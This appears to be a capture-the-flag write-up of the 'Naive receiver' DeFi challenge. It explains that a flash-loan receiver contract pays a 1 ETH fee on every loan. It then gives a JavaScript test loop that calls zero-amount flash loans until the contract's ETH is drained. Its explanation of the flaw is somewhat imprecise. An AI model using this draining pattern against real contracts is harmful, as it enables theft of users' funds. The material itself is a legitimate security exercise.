# Challenge #2 - Naive receiver   
 There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.

 You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.

 Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;) 

## Exploit 
The user contract ``FlashLoanReceiver.sol`` is not checking the ``msg.value`` variable 
when ``recieveEther()`` is called. That way, we can drain his contract by passing a 0 value and 
collecting the ``1 ether`` FEE from the user's contract.   

```js
	it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */   
		while(await ethers.provider.getBalance(this.receiver.address) != 0){
			await this.pool.flashLoan(this.receiver.address, 0)
		}
    });
```
